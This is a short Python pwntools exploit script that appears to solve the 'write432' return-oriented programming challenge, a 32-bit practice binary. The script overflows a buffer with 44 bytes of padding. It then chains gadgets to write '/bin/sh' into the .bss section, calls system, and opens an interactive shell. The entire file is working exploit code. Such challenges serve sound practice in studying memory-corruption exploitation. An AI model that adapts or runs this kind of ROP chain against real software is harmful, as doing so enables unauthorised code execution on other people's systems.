from pwn import *

context(os="linux", arch="i386")

def main():
	conn = process('./write432')

	system = 0x08048430
	pop2ret = 0x080486da
	mov_edi_ebp = 0x08048670
	bss_addr = 0x0804a040

	payload = ''
	payload += 'A'*44
	payload += "\xda\x86\x04\x08" # p32(pop2ret)
	payload += "\x40\xa0\x04\x08" #p32(bss_addr)
	payload += '/bin'
	payload += "\x70\x86\x04\x08" # p32(mov_edi_ebp)
	payload += "\xda\x86\x04\x08" # p32(pop2ret)
	payload += "\x44\xa0\x04\x08" #p32(bss_addr+4)
	payload += '/sh\x00'
	payload += "\x70\x86\x04\x08" # p32(mov_edi_ebp)
	payload += "\x30\x84\x04\x08" # p32(system)
	payload += 'A'*4
	payload += "\x40\xa0\x04\x08" # p32(bss_addr)

	print(payload)
	print(conn.recv(100))

	conn.send(payload)
	conn.interactive()

if __name__ == "__main__":
	main()